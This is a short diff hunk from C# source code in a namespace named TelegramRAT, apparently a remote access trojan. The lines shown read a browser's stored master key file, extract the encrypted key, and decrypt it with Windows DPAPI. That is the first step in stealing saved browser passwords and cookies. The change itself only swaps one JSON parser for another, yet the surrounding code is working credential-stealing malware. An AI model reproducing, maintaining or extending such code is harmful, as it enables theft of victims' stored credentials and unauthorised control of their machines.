@@ -35,7 +35,7 @@ namespace TelegramRAT
                 }
                 // Get master key
                 masterKey = File.ReadAllText(masterKeyPath);
-                masterKey = (string)Newtonsoft.Json.Linq.JObject.Parse(masterKey)["os_crypt"]["encrypted_key"];
+                masterKey = SimpleJSON.JSON.Parse(masterKey)["os_crypt"]["encrypted_key"];
                 // Decrypt master key
                 byte[] keyBytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(masterKey)).Remove(0, 5));
                 byte[] masterKeyBytes = DPAPI.Decrypt(keyBytes, null, out string _);
